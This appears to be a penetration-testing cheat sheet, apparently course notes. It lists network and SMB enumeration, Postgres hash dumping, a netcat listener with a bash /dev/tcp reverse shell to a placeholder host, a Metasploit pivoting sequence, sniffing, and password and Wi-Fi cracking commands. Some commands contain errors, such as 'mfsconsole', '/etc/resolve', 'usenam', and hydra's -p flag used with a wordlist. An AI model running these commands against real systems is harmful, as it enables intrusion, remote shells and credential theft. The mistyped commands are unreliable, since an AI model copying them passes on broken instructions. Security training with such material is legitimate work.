# **Cheat sheet NSP**

## **Enumeration**

### **Network discovery**
- **Network/Default gateway:** 
    > ip a  
    > ip r

- **Network calc:**
    > ipcalc `ip`

- **DNS:**
    > cat /etc/resolve  
    > nslookup

- **DHCP:**
    > dhcpdump -i `<interface>`

- **Extra:**
    > traceroute `<ip>`  
    > nslookup `<domain>`  
    > whois `<domain>`

<br>

### **Device discovery**
- **Active device:**
    > nmap -sn `<ip>`-`<range>`

- **Ports:**
    > nmap -p- -sV `<ip>`  
    > nmap -p- -sV -iL `<file_with_ips>`

- **Full scan:**
    > nmap -p- -v -A -T5 -sV -iL `<file_with_ips>`

<br>

### **Vulnerabilty scanning**
- **CVE-scan:**
    > nmap --script=vuln `<ip>`  
    > nmap --script=vuln uo -iL `<file_with_ips>`

- **Find scrips:**
    > ls /usr/share/nmap/scripts | grep `<item>`

- **nmapautomater**
    > ./nmapAutomator.sh --host 192.168.52.70 --type `<type>`  

    **Scan Types:**
	* **Network** : Shows all live hosts in the host's network (~15 seconds)
	* **Port**    : Shows all open ports (~15 seconds)
	* **Script**  : Runs a script scan on found ports (~5 minutes)
	* **Full**    : Runs a full range port scan, then runs a thorough scan on   new ports (~5-10 minutes)
	* **UDP**     : Runs a UDP scan "requires sudo" (~5 minutes)
	* **Vulns**   : Runs CVE scan and nmap Vulns scan on all found ports (~5-15 minutes)
	* **Recon**   : Suggests recon commands, then prompts to automatically run them
	* **All**     : Runs all the scans (~20-30 minutes)

<br>

### **SMB (Server Message Block)**
- **Discover:**
    > nmap -p 139,445 --open -iL `<file_with_ips>`

- **Share discovery:**
    > smbclient -L \\`<ip>`\\ -U anonymous
- **Connect to share:**
    > smbclient \\\\`<ip>`\\share -U anonymous
    
<br>

### **DNS/LDAP:**
- **Discover DNS/LDAP:**
    > nmap -p 389 -sV `<file_with_ips>`

- **DNS/LDAP info:**
    > nmap -p 389 --script ldap-rootdse 192.168.52.4

- **DNS/LDAP zone transfer:**
    > dig axfr `<domain>`

<br>

### **Postgres**
- **Connection to database:**
    > psql -h `<ip>` -U `<username>`

- **Dumping of hashes:**
    > select usenam, passwd from pg_shadow  
    > copy to file (replace '|' with ':') > postgres.hash

<br>

### **Reverse shell:**
- **Start listener:**
    > nc -lvp `<>`

- **Start reverse shell:**
    > bash -i >& /dev/tcp/`<ip>`/`<port>` 0>&1

<br>

### **Sniffing**
- **Read data betwee two devices:**
    > ettercap -T /`<ip>`// /`<ip>`//

<br>

### **Pivoting**
- **Flow:**
    > get shell to device  
    > adduser `<username>` -p `<password>`  
    > check user -> cat /etc/passwd  
    > nmap -sV `<ip>`  
    > ssh `<username>`@`<ip>` -p `<port>`  
    > ip a / ip r  
 
    > mfsconsole  
    > search ssh  
    > use multi/ssh/sshexec  
    > set rhosts `<ip>`  
    > set username `<username>`  
    > set password `<password>`  
    > set rport `<port>`  
    > exploit  
    > bg  
    > sessions  
    > route add otheripfoundwithsshlogin/netmask 2(sessionid)  
    > search socks  
    > use auxiliary/server/socks_proxy  
    > run -j  
    > jobs  
    
    > search ping_sweep  
    > use post/multi/gather/ping_sweep  
    > sessions  
    > set session `<sessionid>` 
    > set rhosts `<ip_of_other_device>`/`<netmask>`
    > exploit  
    
    > proxychains nmap -sn `<ip_of_other_device>`/`<netmask>`  
    > proxychains nmap -sn -p- -v -A -T5 -sV `<ip_of_hidden_device>`  
  
    > sessions  
    > sessions -i `<sessionid>`  
    > portfwd add -l 8080 -p 80 -r `<ip_of_hidden_device>`  

<br>

### **Cracking**
- **Word list generation:**
    > crunch `<min-lengt>` `<max-lengt>` -t flag-%%%% -o `<wordlist>`.lst  

- **Hydra:**
    > hydra -l `<username>` -p `<wordlist>`.lst `<ip>` `<protocol>`

- **ZIP:**
    > zip2john `<name>`.zip > zip.hash  
    > john --wordlist=`<wordlist>`.lst zip.hash

- **Hashes:**
    > hashcat `<hashes>`.hash --user  
    > hashcat `<hashes>`.hash --user -m `<hash_type>` `<wordlist>`.lst 

- **WiFi:**
    > aircrack-ng -w `<wordlist>`.lst `<capture>`.pcap  

<br>

### **WireShark**
- **Flow:**
    > right click on a packet  
    > protocol preferences  
    > wireless lan  
    > decryption keys  
    > add wpa-pwd  
    > add the key  

- **Searchterm:**
    * dns: can see websites visited
    * http: click a packet and right click follow http stream
    * eapol: packets for making it possible to connect to the network

<br>

### **Copy files**
> scp -P portnumber `<username>`@`<source_ip>`:`<filename>` `<username>`@`<destination_ip>`:`<filename>`

